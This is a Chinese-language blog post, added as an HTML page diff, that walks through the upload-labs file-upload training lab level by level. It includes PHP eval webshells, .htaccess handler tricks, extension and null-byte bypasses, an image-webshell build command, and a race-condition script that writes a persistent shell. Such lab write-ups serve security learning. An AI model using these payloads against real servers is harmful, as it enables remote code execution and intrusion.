@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"aomandetiankong.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="http:&#x2F;&#x2F;localhost&#x2F;upload-labs&#x2F;    less 11.考察前端JS校验，因此可以直接在浏览器检查代码把checkFile()函数(即如下图红色框选中的函数)删了或者也可以把红色框改成true，并按回车，即可成功上传php文件 2.先将要上传的文件后缀名修改成页面允许上传的类型，这样在点击上传后就可以通过前端的验证，用burp工具进行抓包，在burp中将文件后缀名改回原本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="uploads学习">
+<meta property="og:url" content="https://aomandetiankong.github.io/2022/02/21/uploads%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="http:&#x2F;&#x2F;localhost&#x2F;upload-labs&#x2F;    less 11.考察前端JS校验，因此可以直接在浏览器检查代码把checkFile()函数(即如下图红色框选中的函数)删了或者也可以把红色框改成true，并按回车，即可成功上传php文件 2.先将要上传的文件后缀名修改成页面允许上传的类型，这样在点击上传后就可以通过前端的验证，用burp工具进行抓包，在burp中将文件后缀名改回原本">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-21T14:21:42.000Z">
+<meta property="article:modified_time" content="2022-02-21T14:22:28.124Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://aomandetiankong.github.io/2022/02/21/uploads%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>uploads学习 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2022/02/21/uploads%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          uploads学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-21 22:21:42 / Modified: 22:22:28" itemprop="dateCreated datePublished" datetime="2022-02-21T22:21:42+08:00">2022-02-21</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a target="_blank" rel="noopener" href="http://localhost/upload-labs/">http://localhost/upload-labs/</a>    <?php @eval($_POST['muma']);?><br>less 1<br>1.考察前端JS校验，因此可以直接在浏览器检查代码把checkFile()函数(即如下图红色框选中的函数)删了或者也可以把红色框改成true，并按回车，即可成功上传php文件</p>
+<p>2.先将要上传的文件后缀名修改成页面允许上传的类型，这样在点击上传后就可以通过前端的验证，用burp工具进行抓包，在burp中将文件后缀名改回原本想要上传的格式，再进行上传，这样就可以上传我们想要的类型文件而不会被前端的验证拦截。采用burpsuit抓包修改文件类型（上传1.jpg修改为1.php）<br>3.禁用js（F12 F1禁用js）<br>4.直接修改在F12中加入.php文件<br>5.删除验证部分代码<br>less2</p>
+<p>上传了一个文件名后缀为.php的文件后提示类型错误，错误回显的方式不是弹窗，是页面直接提示，所以不是前端验证。查看一下源码。<br>我们可以发现这个Content-Type，这里就对你上传的文件进行了一次类型检查，图中网页检查的类型为image/jpeg，这是因为因为我们上传的本身就是jpg文件，因此和第一关一样更改后缀为php就可以了。<br>但还有另一种方法，如果我们直接上传php文件的话，我们会发现这次的Content-Type变成了application/octet-stream，导致检查不通过，因此我们将其更改为image/jpeg也可以绕过检查。<br>MINE的原理是判断$_Files[“upload_file”][“type”]是不是图片格式（image/gif、imge/jpeg、image\png），不是则不允许上传。$_Files[“upload_file”][“type”]的值是从请求数据包中Content-Type中获取。<br>抓包改Content-Type即可。<br>Less3<br>提示告诉我们这题过滤了.asp|.aspx|.php|.jsp这四个后缀，不过没了这四个后缀，我们还有很多其他替代品，例如：<br>ASP：asa/cer/cdx<br>ASPX：ashx/asmx/ascx<br>PHP：php4/php5/phtml/php3/pht<br>JSP：jspx/jspf<br>当然在使用这些后缀之前可能要先对apache进行配置改一下httpd.conf文件里的#AddType application/x-httpd-php .php .phtml<br>为AddType application/x-httpd-php .php .phtml .php5 .php3<br>记得去掉#号。修改完配置文件记得要重启一下phpstudy服务环境<br>然后把一句话木马文件.php后缀改为.php5 即可上传</p>
+<p>L4<br>其中，.htaccess文件中内容SetHandler application/x-httpd-php用来设置当前目录所有文件都使用PHP解析，无论上传任何文件，只要符合php语言代码规范，就会被当做php文件执行。</p>
+<p>首先我们要创建一个txt文件，在这个文件中写入SetHandler application/x-httpd-php，接着更改后缀为.htaccess，但是由于windows的命名规则导致文件不能没有文件名，因此我们先随意取一个文件名。当然也可以使用FilesMatch指定文件，示例如下：</p>
+<p>&lt;FilesMatch “muma”&gt;<br>SetHandler application/x-httpd-php<br><br>这意味着文件名字中带有muma的文件会被解析成php。在上传.htaccess文件时要使用burp suite将这个文件的文件名删去。接着只要上传我们的muma1.jpg，用蚁剑连接就可以了。<br>L5-7<br>均为观察什么没有被限制，没有了大小写的限制，所以我们可以对后缀名进行大小写混合如将’test.php’改写为’test.Php’，以此绕过黑名单。</p>
+<p>没有了删除空格的代码，所以可以在文件后缀名末尾加空格，如’test.php’改写为’test.php ‘，windos在存储时会自动去处空格，但在检测时可以绕过黑名单限制。<br>没有删除文件末尾点的代码，所以可以在文件后缀名后加点，如’test.php’改写为’test.php.’<br>会去处文件名末尾的点，然后首尾去空。因此我们构建muma1.php. .文件名就可以成功绕过了，进入upload发现文件依然是muma1.php。</p>
+<p> 这关起到过滤作用的是str_ireplace()函数，它会检测文件名中包含$deny_ext的字符并替换为空。利用这一特点，我们可以进行双写后缀名操作，即加一个后缀名让他替换掉，如‘test.php’改写为’test.pphphp’当后缀名被替换掉后会变成空格，可以绕过黑名单的检测，但是存储时空格会被去掉，最后剩下的文件后缀名合并为’test.php’。<br>L12<br>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。上传zoe.php用BP抓包修改参数，把upload/后面加上zoe.php%00即savepath后面，下面的filename=”zoe.php”改为zoe.png<br>放包之后用蚁剑连接<br>这里有一个细节，蚁剑连接时要把下面蓝色的部分删掉</p>
+<p>ps.php版本要小于5.3.4，magic_quotes_gpc需要为Off状态。<br>L13<br>这一关白名单，文件上传路径拼接生成，而且使用了post发送的数据进行拼接，我们可以控制post数据进行0x00截断绕过白名单</p>
+<p>补充知识：POST不会对里面的数据自动解码，需要在Hex中修改。</p>
+<p>上传zoe.php用BP抓包修改<br>在../upload/ 路径下加上zoe.php+ +号是为了方便后面修改Hex</p>
+<p>+号的Hex是2b，这里我们要把它改为00（效果如下图二）</p>
+<p>然后就可以放包了，复制图片地址并用蚁剑进行连接<br>但是这里要注意一下，蚁剑连接填的URL地址要把图下面的蓝色部分删了(即</p>
+<p>php后面部分要删掉)<br>L13-16<br>1.这关涉及到了上传图片码，首先我们要了解什么是图片码。图片码，又名图片一句话。顾名思义，就是将一句话木马藏匿在图片之中，从而达到绕过检查的效果。我们来介绍两种制作图片码的方法：</p>
+<p>cmd命令制作<br>将你的php木马文件和图片放在同一个目录之下，shift+右键在这个目录下打开cmd，输入以下命令：</p>
+<p>copy tupian.jpg /b + muma1.php /a shell.jpg<br>这里的tupian.jpg是我们的原始图片，muma1.php是一句话木马文件，最后生成的文件是shell.jpg。<br>2.在upload文件夹中写入下面这个php文件：<br><?php
+header("Content-Type:text/html;charset=utf-8");
+$file = $_GET['file'];
+if(isset($file)){
+    include $file;
+}else{
+    show_source(__file__);
+}
+?><br>这里我把文件命名为include.php<br>我们构建一个url读取图片：127.0.0.1/upload-labs/upload/include.php?file=9220211125204748.gif<br>读取成功，但是读取出来一段乱码，可以用phpinfo</p>
+<p>可以使用蚁剑进行连接<br>L17<br>这里二次渲染用到了几个和imagecreat有关的函数，例如imagecreatefromgif()，作用就是创建一个画布，并从GIF文件或URL地址中载入一副图像。渲染后的图像利用move_uploaded_file()将上传的文件移动到新位置下，最后用unlink()删除原文件。<br>上传正常的GIF图片下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）并插入PHP一句话，上传带有PHP一句话木马的GIF图片<br>L18<br>网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件，或者网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件，这么看来如果我们还是上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。但是如果没有文件包含漏洞的话，我们就只能上传一个php木马来解析运行了。在类似这两种情况下我们就可以考虑使用竞争条件漏洞解题。<br>使用burp suite营造很多人上传info.php（<?php phpinfo();?>）的场景，同时我们用蚁剑连接，下面是具体流程：<br>首先我们上传文件并抓包，将抓包内容发送到Intruder中，随意构建一个payload爆破点，例如我选定GET中的action内容进行爆破，设置字典为1-9999的数字，设置10线程。</p>
+<p>设置完之后进行攻击，在攻击的同时不断访问127.0.0.1/upload/info.php，将phpinfo的页面刷新出来后在upload文件夹中就可以发现info.php也成功上传。</p>
+<p>不断在浏览器访问我们的webshell，会有一瞬间的访问成功。把一句话木马换一下改为<br><?php fputs(fopen('Tony.php','w'),'<?php @eval($_POST["Tony"])?>‘);?&gt;<br>把这个php文件通过burp一直不停的重放，然后再写python脚本去不停的访问我们上传的这个文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一个Tony.php的一句话。在正常的渗透测试中这也是个好办法。因为单纯的去访问带有phpinfo()的文件并没有什么效果。一旦删除了还是无法利用。但是这个办法生成的Tony.php服务器是不会删除的，我们就可以通过蚁剑去链接了。<br>选择Clear$</p>
+<p>然后我们写一个python脚本，通过它来不停的访问我们上传上去的PHP文件(即如上图显示的zoe.php文件) 由于隐私原因，IP地址不能放出来，下面的脚本的url地址XXX都是代表IP地址<br>import requests<br>url = “<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php&quot;">http://xxx.xxx.xxx.xxx/upload-labs/upload/zoe.php&quot;</a><br>while True:<br>    html = requests.get(url)<br>    if html.status_code == 200:<br>        print(“OK”)<br>        break<br>接下来我们可以在BP点击开始攻击<br>L19<br>脚本更改为import requests<br>url = “<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png&quot;">http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png&quot;</a><br>while True:<br>    html = requests.get(url)<br>    if ( ‘Warning’  not in  str(html.text)):<br>        print(‘ok’)<br>        break<br>建议BP的线程能设高一点，效果可能会更好。<br>L19<br>move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /.这里我们可以利用这一点构建文件名<br>L21这一关白名单<br>验证过程：<br>–&gt; 验证上传路径是否存在<br>–&gt; 验证[‘upload_file’]的content-type是否合法（可以抓包修改）<br>–&gt; 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）<br>–&gt;判断file不是数组则使用explode(‘.’, strtolower($file))对file进行切割，将file变为一个数组<br>–&gt; 判断数组最后一个元素是否合法<br>–&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name<br>–&gt; 上传文件</p>
+<p>补充知识：<br>explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。<br>end(array)函数，输出数组中的当前元素和最后一个元素的值。<br>reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值<br>count(array)函数，计算数组中的单元数目，或对象中的属性个数<br>可以发现$file_name经过reset($file) . ‘.’ . $file[count($file) - 1];处理。<br>如果上传的是数组的话，会跳过$file = explode(‘.’, strtolower($file));。并<br>且后缀有白名单过滤$ext = end($file);<br>$allow_suffix = array(‘jpg’,’png’,’gif’);<br>而最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组。$file[0]为smi1e.php/，也就是reset($file)，然后再令$file[2]为白名单中的jpg。此时end($file)等于jpg，$file[count($file) - 1]为空。而 $file_name = reset($file) . ‘.’ . $file[count($file) - 1];，也就是smi1e.php/.，最终move_uploaded_file会忽略掉/.，最终上传smi1e.php。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/02/05/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/" rel="prev" title="web">
+      <i class="fa fa-chevron-left"></i> web
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
